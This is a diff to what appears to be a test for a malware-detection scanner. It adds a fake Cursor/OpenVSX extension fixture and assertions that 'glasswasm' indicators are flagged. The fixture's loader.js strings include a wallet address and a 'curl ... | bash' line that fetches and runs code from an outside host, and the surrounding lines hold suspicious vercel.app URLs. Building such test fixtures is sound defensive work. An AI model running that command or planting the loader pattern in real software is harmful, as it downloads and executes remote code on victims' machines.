@@ -96,6 +96,23 @@ function run() {
     "const secondary = 'https://cloudflarefirewall.vercel.app/api/v1';", // push-guard: ignore
     "const legacy = 'https://cloudflaresecurity.vercel.app/api/ssh-key';" // push-guard: ignore
   ].join("\n"));
+  write(path.join(home, ".cursor", "extensions", "exargd.vsblack-0.0.1", "package.json"), JSON.stringify({
+    publisher: "exargd",
+    name: "vsblack",
+    version: "0.0.1",
+    __metadata: {
+      id: "vscode/exargd/vsblack@0.0.1"
+    }
+  }, null, 2));
+  write(path.join(home, ".cursor", "extensions", "exargd.vsblack-0.0.1", "snqpkebiwrxmoivl.wasm"), "placeholder");
+  write(path.join(home, ".cursor", "extensions", "exargd.vsblack-0.0.1", "loader.js"), [
+    "require('./wasm_exec.js');",
+    "WebAssembly.instantiate(bytes, go.importObject);",
+    "fetch('https://api.mainnet.solana.com', { method: 'POST' });",
+    "const wallet = '6ExrZayPZzMMSnszc42cH81DpuKT8FhCX9H6Sesn6rpz';",
+    "const cp = require('child_process');",
+    "cp.execSync('curl -fsSL https://dodod.lat/linux/i/_ | bash', { windowsHide: true });"
+  ].join("\n"));
   write(path.join(home, "observatory-pr", ".gitignore"), [
     "node_modules/",
     "branch_structure.json",
@@ -315,6 +332,10 @@ function run() {
   assert(ids.has("atomicarch-payload-text-indicator"));
   assert(ids.has("ottercookie-npm-package-reference"));
   assert(ids.has("ottercookie-text-indicator"));
+  assert(ids.has("glasswasm-openvsx-package-reference"));
+  assert(ids.has("glasswasm-openvsx-wasm-payload-file"));
+  assert(ids.has("glasswasm-openvsx-loader-shape"));
+  assert(ids.has("glasswasm-openvsx-text-indicator"));
   assert(ids.has("astro-config-require-loader"));
   assert(ids.has("astro-config-network-eval-loader"));
   assert(ids.has("astro-config-hidden-payload-line"));
